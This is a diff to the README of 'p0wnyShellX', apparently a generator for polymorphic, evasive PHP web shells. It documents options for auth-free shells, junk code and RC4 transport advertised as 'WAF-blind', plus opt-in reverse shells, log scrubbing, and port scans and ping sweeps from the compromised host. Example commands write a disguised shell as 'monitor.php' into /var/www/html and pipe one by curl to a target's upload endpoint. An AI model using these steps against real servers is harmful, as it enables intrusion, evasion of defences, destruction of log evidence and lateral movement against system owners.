@@ -312,22 +312,56 @@ python3 p0wnyShellX.py [OPTIONS]
 
 ### Options
 
+**Output**
+
+| Flag | Short | Default | Description |
+|---|---|---|---|
+| `--output` | `-o` | `shell.php` | Output filename (or full path) |
+| `--outdir` | `-d` | `.` | Output directory — combined with `-o` for the filename |
+| `--stdout` | — | false | Print PHP to stdout instead of a file. Status messages go to stderr. Useful for piping. |
+
+**Authentication**
+
 | Flag | Short | Default | Description |
 |---|---|---|---|
 | `--password` | `-p` | `changeme666` | Login password |
 | `--user` | `-u` | `sysadmin` | Login username |
-| `--output` | `-o` | `shell.php` | Output file path |
+| `--no-auth` | — | false | Strip all auth: no login form, no session, no bcrypt. Shell is directly accessible. |
+
+**Polymorphism**
+
+| Flag | Short | Default | Description |
+|---|---|---|---|
 | `--junk` | `-j` | random 20–80 | Number of junk functions (max 200) |
-| `--theme` | `-t` | random | CSS theme (see table below). `poly` = random palette per build, `none` = no CSS |
-| `--seed` | `-s` | — | Fixed RNG seed for reproducible output |
 | `--no-junk` | — | false | Disable junk function generation |
+| `--theme` | `-t` | random | CSS theme. `poly` = random palette per build, `none` = no CSS (see table below) |
+| `--seed` | `-s` | — | Fixed RNG seed for reproducible output |
 | `--transport` | — | `plain` | AJAX encoding: `plain` / `mimic` / `rc4` |
+
+**Optional shell features** *(opt-in — not compiled unless flag is passed)*
+
+| Flag | Compiles | Description |
+|---|---|---|
+| `--revshell` | `revshell` command | Reverse shell via bash → python3 → perl → php fallback |
+| `--clearlog` | `clearlog` command | Strip regex-matching lines from a log file in-place |
+| `--portscan` | `portscan` command | TCP port scan from the target host |
+| `--pingsweep` | `pingsweep` command | TCP-based host discovery from the target host |
 
 ### Examples
 
 ```bash
 # Minimal — password only
 python3 p0wnyShellX.py -p "MyPass123!" -o shell.php
+
+# Custom output directory + filename
+python3 p0wnyShellX.py -p "MyPass123!" -d /var/www/html/ -o monitor.php
+
+# Print to stdout — useful for piping or file upload chains
+python3 p0wnyShellX.py -p "MyPass123!" --stdout 2>/dev/null > shell.php
+python3 p0wnyShellX.py -p "MyPass123!" --stdout 2>/dev/null | curl -F "file=@-" http://target/upload
+
+# No-auth shell — no login form, direct access (magic file upload, quick tests)
+python3 p0wnyShellX.py --no-auth --no-junk -t none -o shell.php
 
 # Full control
 python3 p0wnyShellX.py \
@@ -343,9 +377,6 @@ python3 p0wnyShellX.py -p "MyPass123!" --seed 42 -o shell.php
 # Minimal output (no junk, fastest generation)
 python3 p0wnyShellX.py -p "MyPass123!" --no-junk -o shell.php
 
-# Corporate blue theme, custom username
-python3 p0wnyShellX.py -p "MyPass123!" -u webmaster -t corporate-blue -o shell.php
-
 # Polymorphic CSS — random palette, random app name, unique signature per build
 python3 p0wnyShellX.py -p "MyPass123!" -t poly -o shell.php
 
@@ -360,6 +391,9 @@ python3 p0wnyShellX.py -p "MyPass123!" --transport mimic -o shell.php
 
 # RC4 mode — RC4 + shuffled base64 alphabet, unique per build, WAF-blind
 python3 p0wnyShellX.py -p "MyPass123!" --transport rc4 -o shell.php
+
+# Shell with all optional features compiled in
+python3 p0wnyShellX.py -p "MyPass123!" --revshell --clearlog --portscan --pingsweep -o shell.php
 ```
 
 ---
@@ -374,15 +408,65 @@ Once deployed and authenticated, the shell supports:
 | `cd /path` | Change working directory (persisted across commands) |
 | `download /path/to/file` | Download file to browser |
 | `upload /remote/path` | Upload local file via browser dialog |
-| `revshell <IP> <PORT>` | Spawn reverse shell — tries bash, python3, perl, php in order (first available wins) |
-| `clearlog <file> <pattern>` | Strip lines matching `<pattern>` (case-insensitive regex) in-place from `<file>` |
-| `portscan <ip[-range]> <ports>` | TCP port scan from the target host — e.g. `portscan 10.0.0.1-254 22,80,443` or `portscan 10.0.0.5 20-25,80` |
 | `clear` | Clear terminal output |
 | `Tab` | Autocomplete files and commands |
 | `↑ / ↓` | Command history navigation |
 | `Ctrl+L` | Clear screen |
 | `Ctrl+C` | Cancel current input |
 | `Ctrl+U` | Clear input line |
+
+**Optional commands** *(compiled only if the corresponding flag was passed at generation time)*
+
+| Command | Full syntax | Description |
+|---|---|---|
+| `revshell` | `revshell <IP> <PORT> [--method bash\|python3\|perl\|php]` | Reverse shell. Fallback chain: bash → python3 → perl → php. `--method` forces a specific binary. |
+| `clearlog` | `clearlog <file> <pattern>` | Strip lines matching `<pattern>` (case-insensitive regex) in-place from `<file>`. |
+| `portscan` | `portscan <target> <ports> [--stealth\|--fast] [--timeout N] [--pause N]` | TCP scan from the target host. |
+| `pingsweep` | `pingsweep <target> [--ports <list>] [--stealth\|--fast] [--timeout N] [--pause N]` | TCP-based host discovery from the target host. |
+
+**portscan / pingsweep — target formats**
+
+| Format | Example |
+|---|---|
+| Single IP | `192.168.0.1` |
+| Last-octet range | `192.168.0.1-254` |
+| Full IP range | `192.168.0.1-192.168.0.50` |
+| Comma list | `192.168.0.1,10.0.0.5,172.16.0.1` |
+| CIDR | `192.168.0.0/24` |
+| Mixed | `192.168.0.0/24,10.0.0.1` |
+
+**portscan — port formats and presets**
+
+| Value | Ports |
+|---|---|
+| `minimal` | 22, 80, 443 |
+| `web` | 80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 4848, 9200 |
+| `top20` | 20 most common ports (nmap reference) |
+| `top100` | 100 most common ports (nmap reference) |
+| `22,80,443` | Custom comma list |
+| `22-100` | Custom range |
+
+**portscan / pingsweep — scan modes**
+
+Modes define timing. `--timeout` and `--pause` override the mode preset if specified.
+
+| Mode | Timeout | Pause between connections |
+|---|---|---|
+| `--fast` | 0.1 s | 0 ms |
+| *(default)* | 0.3 s | 0 ms |
+| `--stealth` | 2.0 s | 500 ms |
+| `--timeout N` | custom | — |
+| `--pause N` | — | custom (ms) |
+
+**pingsweep — probe port presets** (`--ports`)
+
+| Value | Ports tried per host |
+|---|---|
+| *(default)* | 80, 443, 22 |
+| `minimal` | 22, 80 |
+| `web` | 80, 443, 8080, 8443 |
+| `full` | 22, 80, 443, 8080, 3389, 3306, 5432, 6379, 27017 |
+| `N,N,...` | Custom list |
 
 ---
 
